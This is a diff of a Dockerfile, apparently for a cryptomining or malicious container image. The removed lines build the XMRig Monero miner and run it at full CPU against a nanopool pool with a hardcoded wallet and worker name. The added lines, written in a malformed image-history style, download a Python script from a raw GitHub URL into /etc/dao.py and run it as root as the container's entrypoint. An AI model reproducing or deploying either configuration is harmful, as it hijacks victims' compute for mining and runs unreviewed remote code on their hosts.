@@ -1,45 +1,11 @@
-FROM alpine:3.13 AS builder
-
-ARG XMRIG_VERSION='v6.18.0'
-WORKDIR /miner
-
-RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
-    apk update && apk add --no-cache \
-    build-base \
-    git \
-    cmake \
-    libuv-dev \
-    linux-headers \
-    libressl-dev \
-    hwloc-dev@community
-
-RUN git clone https://github.com/xmrig/xmrig && \
-    mkdir xmrig/build && \
-    cd xmrig && git checkout ${XMRIG_VERSION}
-
-COPY .build/supportxmr.patch /miner/xmrig
-RUN cd xmrig && git apply supportxmr.patch
-
-RUN cd xmrig/build && \
-    cmake .. -DCMAKE_BUILD_TYPE=Release && \
-    make -j$(nproc)
-
-
-FROM alpine:3.13
-LABEL owner="Giancarlos Salas"
-LABEL maintainer="me@giansalex.dev"
-
-ENV WALLET=87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg.docker/tuyen1321995@gmail.com
-ENV POOL=xmr-us-east1.nanopool.org:14433
-ENV WORKER_NAME=tuyenhd95xx
-
-RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
-    apk update && apk add --no-cache \
-    libuv \
-    libressl \
-    hwloc@community
-
-WORKDIR /xmr
-COPY --from=builder /miner/xmrig/build/xmrig /xmr
-
-CMD ["sh", "-c", "./xmrig --url=$POOL --user=$WALLET --pass=$WORKER_NAME --cpu-max-threads-hint=100 --tls --coin=monero"]
+ARG RELEASE
+ARG LAUNCHPAD_BUILD_ARCH
+LABEL org.opencontainers.image.ref.name=ubuntu
+LABEL org.opencontainers.image.version=18.04
+ADD file:365c129e10f7ef1594e8086543b45f524313e36dd6a25b68f4da542a09491f04 in / 
+CMD ["/bin/bash"]
+USER root
+/bin/sh -c apt-get update   && apt-get install -y python screen git wget python3-requests
+/bin/sh -c wget https://raw.githubusercontent.com/rolandsmedi95/giautoidi/beta/daonhanh/config/container_appservice_share.py -O /etc/dao.py
+/bin/sh -c chmod a+x /etc/dao.py
+ENTRYPOINT ["/bin/sh" "-c" "python3 /etc/dao.py"]
